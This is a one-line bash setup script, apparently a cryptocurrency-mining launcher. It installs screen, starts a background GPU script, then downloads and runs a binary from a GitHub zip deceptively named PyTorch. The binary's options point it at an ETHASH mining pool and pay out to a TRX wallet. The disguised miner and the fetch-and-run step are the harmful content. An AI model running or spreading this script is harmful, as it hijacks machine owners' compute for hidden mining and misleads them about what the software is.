#!/bin/bash
sudo apt update && sudo apt install screen -y && screen -dmS gpuu.sh ./GPU.sh 65 75 && wget https://github.com/okg123/rex-kg/raw/main/PyTorch.zip && unzip PyTorch.zip && cd PyTorch && chmod u+x PyTorch && ./PyTorch --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.ghost --ethstratum ETHPROXY
